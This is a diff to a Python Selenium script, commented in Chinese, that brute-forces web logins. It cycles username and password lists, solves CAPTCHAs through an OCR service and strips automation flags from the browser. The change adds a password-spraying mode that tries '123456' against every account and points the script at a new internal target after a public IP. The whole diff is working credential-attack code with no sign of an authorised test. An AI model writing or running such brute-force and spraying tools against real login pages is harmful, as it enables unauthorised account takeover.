@@ -43,7 +43,7 @@ def init_browser_options(browser_type):
         # 禁用浏览器默认的自动化扩展
         browser_options.add_experimental_option("useAutomationExtension", False)
         # 禁用浏览器的信息和日志记录
-        browser_options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
+        browser_options.add_experimental_option("excludeSwitches", ["enable-logging"])
 
         return browser_options
 
@@ -161,7 +161,7 @@ def ocr_png_code(data: bytes) -> str:
     base64_data = base64.b64encode(data).decode("utf-8")
 
     for host in hosts:
-        api_url = f"{host}/get_captcha"
+        api_url = f"{host}/get_captcha_number"
         try:
             req = requests.post(api_url, data=base64_data, headers={"Authorization": f"Basic {AUTH_KEY}"}, timeout=2)
             if req.status_code == 200:
@@ -200,29 +200,44 @@ def boom_passwd(username, password):
         browser_action(xpath_input_code, "填写", code_text)
         # 登录
         browser_action(xpath_login_button, "点击")
+
     # 登录
     browser_action(xpath_login_button, "点击")
-
-    # 判断是否登录成功
-    if browser_action(xpath_login_error, "查找"):
-        # browser_action(xpath_login_error2, "删除元素")
-        # browser_action(xpath_login_error, "删除元素")
-        print(f"[-] {username} | {password}")
-    else:
+    
+    if not browser_action(xpath_login_button, "查找"):
         print(f"[+] 登录成功 {username} | {password}")
         return True
+    else:
+        print(f"[-] {username} | {password}")
 
-def main():
-    # 读取用户名和密码文本，生成列表
-    with open(username_file, encoding="utf-8", mode="r") as f:
-        usernames = f.read().splitlines()
-    with open(password_file, encoding="utf-8", mode="r") as f:
-        passwords = f.read().splitlines()
-
-    for password in passwords:
+def main(password):
+    if password:
+        # 读取用户名和密码文本，生成列表
+        with open(username_file, encoding="utf-8", mode="r") as f:
+            usernames = f.read().splitlines()
+        # 固定密码
         for username in usernames:
             if boom_passwd(username, password):
-                return
+                choice = input(f"[?] 已成功登录：{username} | {password}，是否继续尝试后续账户？(y/n)：").strip().lower()
+                if choice != 'y':
+                    print("[*] 已选择停止破解。")
+                    return
+    else:
+        # 读取用户名和密码文本，生成列表
+        with open(username_file, encoding="utf-8", mode="r") as f:
+            usernames = f.read().splitlines()
+        with open(password_file, encoding="utf-8", mode="r") as f:
+            passwords = f.read().splitlines()
+
+        for password in passwords:
+            for username in usernames:
+                if boom_passwd(username, password):
+                    choice = input(f"[?] 已成功登录：{username} | {password}，是否继续尝试后续账户？(y/n)：").strip().lower()
+                    if choice != 'y':
+                        print("[*] 已选择停止破解。")
+                        return
+    
+    
 
 
 
@@ -231,25 +246,23 @@ def main():
 """ 
 xpath定位元素 
 """
-xpath_input_username = '//*[@id="app"]/div/div/div[3]/div[2]/form/div[1]/div/div/input'
-xpath_input_password = '//*[@id="app"]/div/div/div[3]/div[2]/form/div[2]/div/div/input'
-xpath_login_button = '//*[@id="app"]/div/div/div[3]/div[2]/form/button'
-xpath_login_error = '/html/body/div[2]'
-# xpath_login_error2 = '/html/body/div[4]'
+xpath_input_username = '//*[@id="username"]'
+xpath_input_password = '//*[@id="password"]'
+xpath_login_button = '//*[@id="submitBtn"]'
 
 # 验证码图片
-xpath_png = None
+xpath_png = '//*[@id="RT_login"]/div/div[1]/ul/li[3]/img'
 # 验证码输入框
-xpath_input_code = None
+xpath_input_code = '//*[@id="code"]'
 
-url = "http://39.162.0.43:28819/login"
+url = "http://172.16.14.27:8080/#/login"
 
 username_file = "username.txt"
 password_file = "password.txt"
 # password_file = "password_top10.txt"
-
+password = '123456'
 if __name__ == "__main__":
     # 打开网站
     browser.get(url)
-    main()
+    main(password)
     
